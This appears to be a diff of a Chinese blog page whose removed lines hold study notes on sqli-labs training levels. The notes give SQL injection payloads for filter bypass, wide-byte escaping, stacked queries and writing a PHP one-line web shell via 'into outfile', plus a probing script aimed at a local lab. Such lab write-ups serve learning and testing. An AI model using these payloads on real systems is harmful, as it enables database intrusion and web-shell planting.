-<p>使用报错注入过滤空格可用 ^ 来连接函数，针对and or全面封锁;</p>
-<h2 id="less26-less28a"><a href="#less26-less28a" class="headerlink" title="less26~less28a"></a>less26~less28a</h2><p>本题通关方式与25大差不差，原理也和WAF绕过有关；</p>
-<h3 id="脚本获取空格符替换对应的url编码"><a href="#脚本获取空格符替换对应的url编码" class="headerlink" title="脚本获取空格符替换对应的url编码"></a>脚本获取空格符替换对应的url编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环查找编码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    code = <span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code) &lt; <span class="number">2</span>):</span><br><span class="line">        code = <span class="string">&#x27;0&#x27;</span> + code</span><br><span class="line">    code = <span class="string">&#x27;%&#x27;</span> + code</span><br><span class="line">    <span class="comment">#构造发送url</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-26/?id=1&#x27;&quot;</span> + code + <span class="string">&quot;%26%26&quot;</span> + code + <span class="string">&quot;&#x27;1&#x27;=1&#x27;&quot;</span></span><br><span class="line">    <span class="comment">#通过回响包中是否返回正确的内容来判断空格正确</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="comment">#解码raw</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure>
-
-<p>这里需要提一下，windows的apache环境对于空格编码有问题，需要docker环境搭建的sqli靶场才能用上述脚本找出合适的编码，不然统统都不能过；</p>
-<p>当然也可以用报错注入的方式来获取内容，用括号分割关键字，就不需要空格了；</p>
-<p>使用命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name Dsqli -p 80:80 --rm acgpiano/sqli-labs</span><br><span class="line">docker start ID</span><br></pre></td></tr></table></figure>
-
-<p>用pull建立镜像后，run，之后映射80端口，使用ssh连接时使用的ip和端口访问docker搭建的靶场；</p>
-<p>对于where 后面 加括号包裹，会将结果返回为0或1，导致有时候只用引号就能判断出注入点，实际上是误判了，这样只用引号去闭合会出现中间的内容写了也没有作用，只有加括号闭合的方式，才能使得中间的语句成功执行；</p>
-<h2 id="less29-less31"><a href="#less29-less31" class="headerlink" title="less29~less31"></a>less29~less31</h2><h3 id="服务器两层架构"><a href="#服务器两层架构" class="headerlink" title="服务器两层架构"></a>服务器两层架构</h3><p>客户端首先发送请求给tomcat服务器，之后由此服务器转交给apache，响应后返回给tomcat，由tomcat传递给客户端；</p>
-<p>客户端访问url传递两个相同参数，tomcat接收第一个，apache接收第二个，第一个使用 <code>getParameter</code> 接收纯数字，第二个用php的get变量接收字符串；</p>
-<h2 id="less32-less37"><a href="#less32-less37" class="headerlink" title="less32~less37"></a>less32~less37</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>php和mysql默认编码为GBK，支持两字节编码，函数执行添加的是ASCII编码（单字节）；</p>
-<p>假如使用单引号注入时，mysql对 <code>id=1&#39;</code> 进行了处理使用斜杠转义 <code>id=1\&#39;</code> ,就无法完成注入；</p>
-<p>如果此时在1后面跟 <code>%df</code> 并加上单引号，会让代码部分变成这样的内容： <code>id=1%df\&#39;</code> ;</p>
-<p>而斜杠的url编码是 <code>%5c</code> , 此时代码部分原义为 <code>id=1%df%5c&#39;</code> ，%df%5c 会被编码为GBK中宽字节的内容；</p>
-<p>此时代码部分是这样的： <code>id=1字&#39;</code> ，由于斜杠被编码带入了，单引号得不到转义，可以完成注入；</p>
-<p>第二种方法，将转义单引号的斜杠再转义，构造语句如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>%5c是斜杠，因为是和单引号一样的敏感内容，所以同样会添加斜杠转义，此时整句处理后的句子如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c <span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">5</span>c <span class="string">&#x27;   --&gt;    id=1字 \\ &#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样就把转义单引号的斜杠给转义掉了；</p>
-<h3 id="addslashes-mysql-real-escape-string"><a href="#addslashes-mysql-real-escape-string" class="headerlink" title="addslashes() / mysql_real_escape_string()"></a>addslashes() / mysql_real_escape_string()</h3><p>里面添加字符串，在字符串内每个敏感字符前添加反斜杠，也是一种起转义的方法；</p>
-<p>在post注入时， %df 会被url编码为 %25 df 的raw字段，需要将raw的内容改为%df才能绕过转义，当已知转义的情况下，用正常post无法注入，记得抓包查看raw的内容；</p>
-<h2 id="less38-less45"><a href="#less38-less45" class="headerlink" title="less38~less45"></a>less38~less45</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单解释，一行两句sql语言，期间用；分号隔开；</p>
-<p>其有局限性，第一，在某些环境下，数据库语言只支持一行一句，第二，web前端查询回显问题，一般只回显第一次查询结果；</p>
-<h3 id="使用堆叠注入写一句话木马"><a href="#使用堆叠注入写一句话木马" class="headerlink" title="使用堆叠注入写一句话木马"></a>使用堆叠注入写一句话木马</h3><p>步骤：</p>
-<ul>
-<li>写权限；</li>
-<li>一句话木马；</li>
-<li>绝对路径;</li>
-<li>select xxx into outfile xxx;</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &lt;?php @eval($_POST[pass]); ?&gt; into outfile xxx;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="less46-less53"><a href="#less46-less53" class="headerlink" title="less46~less53"></a>less46~less53</h2><h3 id="lines-terminated-by-123"><a href="#lines-terminated-by-123" class="headerlink" title="lines terminated by 123"></a>lines terminated by 123</h3><p>sql关键字，字面意义，在每行后面以 123 进行分割；</p>
-<p>用于插入一句话木马，适用于order by 之后注入的情况，没办法使用堆叠注入的情况；</p>
-<h3 id="mysqli-multi-query"><a href="#mysqli-multi-query" class="headerlink" title="mysqli_multi_query()"></a>mysqli_multi_query()</h3><p>使用这个函数可以一行执行多个SQL语句；</p>
-<p>至此开启挑战篇；</p>
-<p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </p>
-<h2 id="less54-less75"><a href="#less54-less75" class="headerlink" title="less54~less75"></a>less54~less75</h2><p>挑战篇用以上内容都可以解决，就盲注手搓会比较恶心，之后学习sqlmap以及bp的脚本盲注；</p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>遇到select完全封锁的情况，且可使用堆叠，可以使用如下语句查看当前数据库下的内容：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure>
-
-<p>之后使用二次注入的思想，利用已有的select查询语法，改变表名，列名，获取数据；</p>
-<p>如下语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n <span class="operator">||</span> id <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
-
-<p>当n为数字时，一直回显都为1，当n不为数字，不会回显；</p>
-<p>当心注入位置的判断！不一定就在where之后！</p>
-</div></div><a class="button-hover more" href="/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/SecondBC/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/SecondBC/page/4/">4</a><a class="extend next" rel="next" href="/SecondBC/page/2/">&lt;i class&#x3D;&quot;fas fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>
+</div></div><a class="button-hover more" href="/SecondBC/2024/02/26/%E5%A3%B3%E8%BF%9B%E9%98%B6/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/SecondBC/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/SecondBC/page/4/">4</a><a class="extend next" rel="next" href="/SecondBC/page/2/">&lt;i class&#x3D;&quot;fas fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>
